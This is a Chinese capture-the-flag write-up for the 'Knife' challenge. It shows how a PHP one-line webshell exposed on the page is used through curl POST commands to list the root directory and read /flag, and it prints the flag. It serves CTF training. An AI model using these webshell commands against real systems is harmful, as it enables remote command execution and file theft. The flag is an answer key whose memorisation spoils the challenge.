# [极客大挑战 2019]Knife

## 题目概述
页面直接暴露了一个 PHP 一句话木马 `eval($_POST["Syc"]);`，利用该 webshell 执行系统命令读取 flag。

## 信息收集
访问目标 URL，页面源码中直接包含：
```php
eval($_POST["Syc"]));
```
页面标题为"白给的shell"，提示"我家菜刀丢了"（菜刀指中国蚁剑/菜刀 webshell 管理工具）。服务器为 PHP/5.5.9，无需任何绕过。

## 漏洞分析
一句话木马通过 POST 参数 `Syc` 接收 PHP 代码并 `eval()` 执行，可直接调用 `system()` 或 `readfile()` 等函数执行任意命令或读取任意文件。

## 利用过程

### Step 1: 列根目录
```bash
curl -s -X POST http://TARGET/ -d 'Syc=system("ls /");'
```
输出中发现 `/flag` 文件。

### Step 2: 读取 flag
```bash
curl -s -X POST http://TARGET/ -d 'Syc=readfile("/flag");'
```
输出：`flag{3b230ab8-b810-4f56-a746-2f00af37ac74}`

## 复现步骤
```bash
# 一行命令完成
curl -s -X POST "http://e310ba1b-dee2-459f-8396-19fcb5598d24.node5.buuoj.cn:81/" \
  -d 'Syc=readfile("/flag");' | grep -oP 'flag\{[^}]+\}'
```

## Flag
```
flag{3b230ab8-b810-4f56-a746-2f00af37ac74}
